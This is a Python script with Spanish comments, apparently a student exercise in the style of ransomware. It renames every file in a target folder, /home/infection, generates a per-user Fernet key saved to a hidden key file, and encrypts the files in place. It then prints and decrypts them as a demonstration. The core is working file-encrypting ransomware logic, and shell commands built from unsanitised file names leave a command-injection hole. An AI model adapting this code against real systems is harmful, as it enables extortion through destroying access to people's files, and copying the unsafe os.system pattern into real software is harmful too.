# Realizado por Solo a 04/08/2022 última actualización 04/08/2022 WIP.


#--------------------------------------------------------------------------------------------------------
#-----------------------------------------LIBRERIAS------------------------------------------------------

import argparse
import os
from cryptography.fernet import Fernet

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------VARIABLES------------------------------------------------------

# deprecated jajajajajjaja users = {}
ruta = "/home/infection"
user = os.popen('whoami').read()[:-1]

#--------------------------------------------------------------------------------------------------------
#---------------------------------------CONFIGURACION----------------------------------------------------

with open (".claves.key", "a") as archivo_clave:
        pass

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------FUNCIONES------------------------------------------------------

def listar_archivos(ruta):
    archivos = []
    nombres = os.popen('ls ' + ruta).read()
    nombres = nombres.strip('\n').split('\n')
    for elem in nombres:
        if not elem.endswith('.ft'):
            os.system(f"mv {ruta}/{elem} {ruta}/{elem.split('.')[0]}.ft")
            archivos.append(elem.split('.')[0] + '.ft')
    return archivos

def guardar_key(user):
    with open (".claves.key", "r") as archivo_clave:
        for linea in archivo_clave:
            if (user + ' :') in linea[:(len(user) + 2)]:
                print ('el usuario ya existe')
                return 0
        key = Fernet.generate_key()
        with open (".claves.key", "a") as archivo_clave:
            archivo_clave.write(user + ' : ' + str(key) + '\n')

def recuperar_key(user):
    try:
        with open('.claves.key', 'r') as key_file:
            for linea in key_file:
                if (user + ' :') in linea[:(len(user) + 2)]:
                    key = linea.split(':')[1].strip()[2:-1]
                    return key.encode()
                else:
                    print ("No hay usuarios con ese nombre registrados.")
    except:
        print ("No hay registros.")

def codificar(lista, key):
    for elem in lista:
        with open ('/home/infection/' + elem, 'rb') as file:
            mensaje = file.read()
            f = Fernet(key)
            encriptado = f.encrypt(mensaje)
        with open ('/home/infection/'+ elem, 'wb') as cryp:
            cryp.write(encriptado)

def decodificar(lista, key):
    for elem in lista:
        with open ('/home/infection/' + elem, 'rb') as file:
            mensaje = file.read()
            f = Fernet(key)
            encriptado = f.decrypt(mensaje).decode()
        with open ('/home/infection/'+ elem, 'w') as cryp:
            cryp.write(encriptado)

# esto ya seria ejecucion creo
# listado de cosas a hacer:
#       - recoges usuario e IP(o algo similar/ no ha podido ser por ahora) y anades al diccionario usuario/key (mejor en el archivo claves.key)
#       - recopilas los archivos en la lista
#       - codificas los archivos con la key del usuario
#--------------------------------------------------------------------------------------------------------
#-----------------------------------------EJECUCION------------------------------------------------------
archivos = listar_archivos(ruta)
guardar_key(user)
codificar(archivos, recuperar_key(user))
for elem in archivos:
    os.system(f"cat /home/infection/{elem}")
decodificar(archivos, recuperar_key(user))
for elem in archivos:
    os.system(f"cat /home/infection/{elem}")

